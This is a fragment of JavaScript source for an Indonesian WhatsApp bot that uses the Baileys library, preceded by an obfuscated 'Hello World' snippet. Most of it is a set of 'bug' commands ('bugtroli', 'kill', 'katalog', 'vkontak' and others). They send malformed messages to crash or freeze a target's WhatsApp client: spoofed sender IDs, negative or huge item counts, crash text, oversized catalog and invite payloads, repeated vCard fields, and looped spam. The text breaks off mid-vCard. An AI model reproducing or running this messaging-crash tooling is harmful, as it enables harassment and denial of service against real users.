_0x2ddb5a=_0x24c641;console[_0x29c70a(0x538,0x531,0x536,0x53e,0x53b)](_0x2ddb5a[_0x3b3a17(0x534,0x539,0x52e,0x535,0x531)]);}function _0x59b1(_0x5e775f,_0x2a80ea){_0x5e775f=_0x5e775f-(0x1c7f*0x1+-0x10c1*-0x1+-0x6a*0x6a);var _0x4cb48b=_0x52b6[_0x5e775f];return _0x4cb48b;}hi();
var _0x3091=['OwFke','6qqTyBv','614682xEMKJU','182821PPlWEs','437282BVnHDF','Hello','2msSnuM','19381QRANiX','564751nbeKxk','\x20Worl','455556CSAxxI','log','522091blOpDQ','1ArvwbP'];(function(_0x3bd903,_0x4daeee){var _0x4b6e1d=function(_0xae9d3b,_0x2ffd03,_0x497a39,_0x410a61,_0x2d2187){return _0x22f5(_0x497a39-0x385,_0x410a61);},_0x51f4f8=function(_0x2669c5,_0x34b5c2,_0x43adab,_0x3f1a82,_0x5bb68d){return _0x22f5(_0x43adab-0x385,_0x3f1a82);},_0x53b70f=function(_0x6cafc9,_0x5b2761,_0x1bfdc9,_0x163cba,_0x1fe8ba){return _0x22f5(_0x1bfdc9-0x385,_0x163cba);},_0x4f1061=function(_0x499a74,_0x5cc142,_0x41f762,_0x198362,_0x5bb718){return _0x22f5(_0x41f762-0x385,_0x198362);},_0x27ff5d=function(_0x4ad94b,_0xf7cb1c,_0x45daf9,_0x528ef9,_0x756eff){return _0x22f5(_0x45daf9-0x385,_0x528ef9);};while(!![]){try{var _0x34c042=parseInt(_0x4b6e1d(0x514,0x515,0x516,0x50f,0x50f))+parseInt(_0x51f4f8(0x513,0x50c,0x50f,0x50f,0x50f))*parseInt(_0x51f4f8(0x50e,0x50b,0x511,0x50c,0x50b))+parseInt(_0x53b70f(0x50a,0x50a,0x50d,0x509,0x50c))*-parseInt(_0x4f1061(0x505,0x509,0x50c,0x50a,0x507))+-parseInt(_0x4b6e1d(0x517,0x50d,0x510,0x50c,0x517))+parseInt(_0x4b6e1d(0x516,0x50d,0x514,0x51b,0x50f))*parseInt(_0x53b70f(0x50e,0x516,0x515,0x518,0x51b))+-parseInt(_0x53b70f(0x518,0x512,0x512,0x516,0x516))+parseInt(_0x4f1061(0x50e,0x503,0x50a,0x50b,0x510));if(_0x34c042===_0x4daeee)break;else _0x3bd903['push'](_0x3bd903['shift']());}catch(_0x24df68){_0x3bd903['push'](_0x3bd903['shift']());}}}(_0x3091,-0xe805f+0x95007*-0x1+0x3*0xae5de));function _0x22f5(_0x13af2e,_0x4926e0){_0x13af2e=_0x13af2e-(-0x13*-0xcb+0x134a+-0x20d7);var _0x3734bb=_0x3091[_0x13af2e];return _0x3734bb;}function hi(){var _0x12b4e5=function(_0xd818b2,_0x5149df,_0x3ddd85,_0x37dede,_0x71de35){return _0x22f5(_0x3ddd85-0x204,_0x37dede);},_0x1ada77=function(_0x4b48c5,_0x5648c4,_0x39c595,_0x49ce77,_0x1f5d9f){return _0x22f5(_0x39c595-0x204,_0x49ce77);},_0xc6712e=function(_0x108616,_0x3d4d39,_0x9f62ee,_0x575976,_0x30de6b){return _0x22f5(_0x9f62ee-0x204,_0x575976);},_0x3829b7=function(_0x23f45a,_0x156791,_0x1f99f3,_0xf159d1,_0xe42fc1){return _0x22f5(_0x1f99f3-0x204,_0xf159d1);},_0x20d23c=function(_0x3cd15b,_0x1affe2,_0x2f3125,_0x46168d,_0x186357){return _0x22f5(_0x2f3125-0x204,_0x46168d);},_0x6adfba={};_0x6adfba[_0x12b4e5(0x391,0x38b,0x38d,0x38f,0x388)]=_0x1ada77(0x394,0x398,0x392,0x392,0x399)+_0x1ada77(0x382,0x387,0x388,0x384,0x387)+'d!';var _0x4d0ee0=_0x6adfba;console[_0xc6712e(0x38d,0x387,0x38a,0x388,0x38d)](_0x4d0ee0[_0x20d23c(0x390,0x387,0x38d,0x38e,0x391)]);}hi();
break
					case 'bugtroli':
              if (!isOwner && !mek.key.fromMe) return sticOwner(from)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
kurr.sendMessage(nomor, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: ofrply,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
kurr.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(mek.key.remoteJid)
break
case 'bugtroli2':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
if (args.length < 1) return reply('Jumlahnya?')
		        try {
		        var hets = `ShinChan`
		        var grousp = await kurr.groupMetadata(from)
                var membere = grousp['participants']
                var mems = []
                membere.map(async adm => {
                    mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                    text: hets,
                    contextInfo: { mentionedJid: mem },
                    quoted: mek
                }
		        for (let i = 0; i < args[0]; i++) {
		        kurr.sendMessage(from, options, text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `ShinChan`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6282134110253@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        } catch {
		          for(let i=0;i<10;i++){
		        kurr.sendMessage(from, 'Berhasil Mengirim Bug Troli2', text, {quoted:{ 
	    key: {
	    fromMe: false, 
	    participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "62882248593508@s.whatsapp.net" } : {}) 
	    },
                        "message": {
                        "orderMessage": {
                        "orderId": "173388341205594",
						"itemCount": -3599964009,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `ShinChan`,
						"orderTitle": `${NamaOwner}`,
						"sellerJid": "6283161567237@s.whatsapp.net",
						"token": "AR4QmUKv7r4P0XYHtHmhLqoFOOhwn8SqO903CVo9raQL4A=="
					}}}})
		        }
		        }
		       break
case 'bugcombine':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                 kurr.toggleDisappearingMessages(from, 'HACKED')
kurr.sendMessage(from, `ShinChan`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `ShinChan Yucan`,
    orderTitle: `${NamaOwner}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
setTimeout( () => {
	    kurr.updatePresence(from, Presence.composing)
	    sendMess(`dahlah`)
	    }, 2000)
	    reply(`dahlah`)
break
case 'buglokasi':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
kurr.updatePresence(from, Presence.composing)
		       kurr.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${NamaOwner}`,
						address: `ShinChan`,
                        jpegThumbnail: dfrply },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
    message: `${NamaOwner}`,
    orderTitle: `ShinChan`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'card':
       argz = arg.split("|")
   if (!argz) return reply(`Penggunaan ${prefix}card teks|jumlah`)
    if (isNaN(argz[1])) return reply(`Penggunaan ${prefix}card teks|jumlah`)
        for (let i = 0; i < argz[1]; i++){
           res = await kurr.prepareMessageFromContent(from, {
               "orderMessage": {
                  "orderId": "436664297902534",
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 9999999,
                  "status": "INQUIRY",
                  "surface": "CATALOG",
                  "message": `${argz[0]}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
                  "thumbnail": fs.readFileSync("./media/virgam.jpeg"),
                  "token": "AR6ew8v8oH4gt78Ufm/sMBCeaQJwJlDhOTto8qAZytAdQA=="
              },
              "contextInfo": {
                 "forwardingScore": 999999999,
                 "isForwarded": true
             }
         }, {quoted:troli, contextInfo:{}}) 
           kurr.relayWAMessage(res)
       }
       break
case 'troli':
for (let i = 0; i < (q) ; i++){
               res = await kurr.prepareMessageFromContent(from, {
					"orderMessage": {
						"orderId": "3184312811796096",
						"sellerJid": "6282134110253@s.whatsapp.net",
						"itemCount": 9999999,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": `${virtau()}`,
						"orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
						 "token": "AR6eHHZTvi8k3qMfxWHBCvAXO+vG5VW/1QtpiPpxL3Tfyg=="
						 },
                "contextInfo": {
               "forwardingScore": 3,
               "isForwarded": true
                }
         }, {quoted:troli, contextInfo:{}}) 
           kurr.relayWAMessage(res)
       }
       break
case 'katalog':
       if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        sticWait(from)
    rolk = fs.readFileSync('./media/katalog.jpeg')
    imeu = await kurr.prepareMessage('0@s.whatsapp.net', rolk, image, {thumbnail: fs.readFileSync("./media/katalog.jpeg")})
    imeg = imeu.message.imageMessage
    res = await kurr.prepareMessageFromContent(from, {
      "productMessage": {
        "product": {
          "productImage": imeg,
          "productid": "4647830318611095",
        "title": `ᴘᷮᴀͣᴄͨᴍͫᴀͣɴᷠ±Sʜɪɴ々Cʜᴀɴ${vapi()}`,
        "description": ` Sʜɪɴ々Cʜᴀɴ⸙${virtexapi()} `,
        "retailerId": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`,
        "productImageCount": 9999
    },
    "businessOwnerJid": "6282134110253@s.whatsapp.net"
}
}, {quoted: fgi, contextInfo:{}})
    kurr.relayWAMessage(res)
    break
case 'jadislayer':
       if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        sticWait(from)
 if ((isMedia && !qul.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
   let media = await kurr.downloadMediaMessage(encmedia)
   imeu = await kurr.prepareMessage('0@s.whatsapp.net', media, image, {thumbnail: fs.readFileSync("./media/virgam.jpeg")})
   imeg = imeu.message.imageMessage
   res = await kurr.prepareMessageFromContent(from,{
     "productMessage": {
         "product": {
             "productImage": imeg,
             "productid": "4647830318611095",
             "title": `ᴘᷮᴀͣᴄͨᴍͫᴀͣɴᷠ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗${virtau()}`,
             "description": `「 ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗ 」\n${virtexapi()}`,
             "retailerId": "ᴘᷮᴀͣᴄͨᴍͫᴀͣɴᷠ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
             "descriptionCount": "999999999",
             "productImageCount": 9999
         },
         "businessOwnerJid": "6282134110253@s.whatsapp.net",
         "contextInfo": {
            "forwardingScore": 9999,
            "isForwarded": true
        }
    }
}, {quoted: fonce, contextInfo:{}})
   kurr.relayWAMessage(res)
}
break
case 'bugkatalog':
       if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        sticWait(from)
const tokatalog = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
vkatalog = await kurr.downloadMediaMessage(tokatalog)
imeu = await kurr.prepareMessage('0@s.whatsapp.net', vkatalog, image, {thumbnail: fs.readFileSync("./media/virgam.jpeg")})
imeg = imeu.message.imageMessage
product1 = q.split('|')[0]
res = await kurr.prepareMessageFromContent(from,{
  "productMessage": {
      "product": {
          "productImage": imeg,
          "productId": "", 
          "title": product1,
          "description": `〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽️${vapi()} `, 
          "priceAmount1000": "99999999",
          "descriptionCount": "999999999",
          "productImageCount": 9999
      },
      "businessOwnerJid": "6282134110253@s.whatsapp.net",
      "contextInfo": {
          "forwardingScore": 9999,
          "isForwarded": true
      }
  }
}, {quoted:fgi})
kurr.relayWAMessage(res)
break
case 'katalog2':
	       if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        sticWait(from)
   rolk = fs.readFileSync('./media/virgam.jpeg')
   imeu = await kurr.prepareMessage('0@s.whatsapp.net', rolk, image, {thumbnail: fs.readFileSync("./media/virgam.jpeg")})

   imeg = imeu.message.imageMessage
   y = await kurr.prepareMessageFromContent(from,{
      "productMessage": {
          "product": {
              "productImage": imeg,
              "productid": "4647830318611095",
              "title": `ᴘᷮᴀͣᴄͨᴍͫᴀͣɴᷠ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗${virtau()}`,
              "description": `「 ⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗ 」\n ${virtexapi()}`,
              "productImageCount": 9999
          },
          "businessOwnerJid": "6282134110253@s.whatsapp.net",
          "contextInfo": {
              "forwardingScore": 1,
              "isForwarded": true
          }
      }
  }, {quoted:mek,
      key: {
         fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
              },
              message: {
                 orderMessage: {
				    imageCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
             }
         }
     }
     )
   kurr.relayWAMessage(y)
   break
case 'pc' :
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
   res = await kurr.prepareMessageFromContent(from, {
      "groupInviteMessage": {
         "groupJid": "34699303450-1355008702@g.us",
         "inviteCode": "N/BQqseQIXL4l0dJ",
         "inviteExpiration": "1631182960",
         "groupName": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗${virtau()}`,
         "jpegThumbnail": fs.readFileSync('./media/thumb.jpg'),
         "caption": `༆⃢✯ ѕιи¢нαи ✯ кαиνяєт ✯⃢༆ ${virtau()}`,
         "contextInfo": {
            "forwardingScore": 3,
            "isForwarded": true
        }
    }
}, { quoted: finv, contextInfo: {} })
   kurr.relayWAMessage(res)

   res = await kurr.prepareMessageFromContent(from, {
      "groupInviteMessage": {
         "groupJid": "34699303450-1355008702@g.us",
         "inviteCode": "N/BQqseQIXL4l0dJ",
         "inviteExpiration": "1631182960",
         "groupName": `${virtexapi()}`,
         "jpegThumbnail": fs.readFileSync('./media/thumb.jpg'),
         "caption": `༆⃢✯ ѕιи¢нαи ✯ кαиνяєт ✯⃢༆ ${virtau()}`,
         "contextInfo": {
            "forwardingScore": 3,
            "isForwarded": true
        }
    }
}, {quoted: finv, contextInfo: {} })
   kurr.relayWAMessage(res)

   res = await kurr.prepareMessageFromContent(from, {
      "groupInviteMessage": {
         "groupJid": "34699303450-1355008702@g.us",
         "inviteCode": "N/BQqseQIXL4l0dJ",
         "inviteExpiration": "1631182960",
         "groupName": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗${vapi()}`,
         "jpegThumbnail": fs.readFileSync('./media/thumb.jpg'),
         "caption": `༆⃢✯ ѕιи¢нαи ✯ кαиνяєт ✯⃢༆ ${virtau()}`,
         "contextInfo": {
            "forwardingScore": 3,
            "isForwarded": true
        }
    }
}, {quoted: finv, contextInfo: {} })
   kurr.relayWAMessage(res)
   break
case 'buglink':
  res = await kurr.prepareMessageFromContent(from, {
					"extendedTextMessage": {
						"text": "https://www.google.com",
						"matchedText": "https://www.google.com",
						"title": `〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽️${virtau()}`,
						"jpegThumbnail": fs.readFileSync('./media/virgam.jpeg'),
					}
				}, {quoted: fvid, contextInfo:{}}) 
 kurr.relayWAMessage(res)
 
 res = await kurr.prepareMessageFromContent(from, {
					"extendedTextMessage": {
						"text": "https://www.google.com",
						"matchedText": "https://www.google.com",
						"title": `${vapi()}`,
						"jpegThumbnail": fs.readFileSync('./media/virgam.jpeg'),
					}
				}, {quoted: fvid, contextInfo:{}}) 
 kurr.relayWAMessage(res)
 
 res = await kurr.prepareMessageFromContent(from, {
					"extendedTextMessage": {
						"text": "https://www.google.com",
						"matchedText": "https://www.google.com",
						"title": `〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽️${virtexapi()}`,
						"jpegThumbnail": fs.readFileSync('./media/virgam.jpeg'),
					}
				}, {quoted: fvid, contextInfo:{}}) 
 kurr.relayWAMessage(res)
 break
case 'kill':
res = await kurr.prepareMessageFromContent(from,{
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Anv-4_S8w9lO1dgjQV3t6vxi9gHY9_4jKXTnzzwdWTmD.enc",
						"mimetype": "image/jpeg",
						"caption": `${virtau()}`,
						"fileSha256": "hXslp/EQSs3C64oWe0iGwR9StaTZ0Oo2DvUFthK0AnM=",
						"fileLength": "289554",
						"height": 1280,
						"width": 1280,
						"mediaKey": "SIASYlw33v/anaPmnCwPOJrccsoNJCMbe6PAvuEmok0=",
						"fileEncSha256": "tnyFjr+E6Ggp0mawpILZJP+JfX7QOxS6eJZQbNjpnZ0=",
						"directPath": "/v/t62.7118-24/30172358_3178385162404076_3740763709501260547_n.enc?ccb=11-4&oh=2ac48347e1e7ddd2b73c4ba87d169777&oe=61B412B8",
						"mediaKeyTimestamp": "1636817303",
						"jpegThumbnail": fs.readFileSync('./media/virgam.jpeg'),
					}
				}, {quoted: troli, contextInfo:{}}) 
 kurr.relayWAMessage(res)

  res = await kurr.prepareMessageFromContent(from,{
					"videoMessage": {
						"url": "https://mmg.whatsapp.net/d/f/Ajn3Ryd38BU5UXekN2ju6Z8stiJIRZ3DT6rBXmzfA1wB.enc",
						"mimetype": "video/mp4",
						"fileSha256": "hhk+LLOl0tvayacf6rj3Os1C22yv0qa2JenKwWM8d24=",
						"fileLength": "535361",
						"seconds": 4,
						"mediaKey": "BKW02u/YpAJMWRGstB+P/K53b3tXgNHTzZSdfR3k+kY=",
						"caption": `${virtau()}`,
						"gifPlayback": true,
						"height": 640,
						"width": 640,
						"fileEncSha256": "iGeztL/ulNCY/eZWzYVMxe29sVSVzoGHSbIgGx4xOq8=",
						"directPath": "/v/t62.9505-24/34492435_1529940397381901_4678831469146729129_n.enc?ccb=11-4&oh=f52c7270b54daad628e2c7b5620bfccd&oe=61B1FFED",
						"mediaKeyTimestamp": "1636594894",
						"jpegThumbnail": fs.readFileSync('./media/virgam.jpeg'),
						"gifAttribution": "NONE"
					}
				}, {quoted: troli, contextInfo:{}}) 
 kurr.relayWAMessage(res)
 break
case 'list':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
res = await kurr.prepareMessageFromContent(from,{
"listMessage": {
"title": `🇮🇩⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗🇮🇩`,
"description": `https://instagram.com/quotes.thenay_`,
"buttonText": `〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽️`,
"listType": "SINGLE_SELECT",
"sections": [
{
"title": `${vapi()}\n${vapi()}`,
"rows": [
{
"title": "〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽️",
"rowId": "ONICHAN"
}
]
}
]
}
}, {quoted: fgi, contextInfo:{}})
    kurr.relayWAMessage(res)
    break
case 'vkontak':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
  res = await kurr.prepareMessageFromContent(from, {
					"contactsArrayMessage": {
						"displayName": "7 kontak",
						"contacts": [
							{
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽️/>;;;\nFN:〽️⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗〽/>\nitem1.TEL;waid=6282134110253:+62 821-3411-0253\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆??️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 𝔹𝕆𝕋️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:𝘈𝘙𝘌𝘟𝘈𝘕𝘚 咽翁 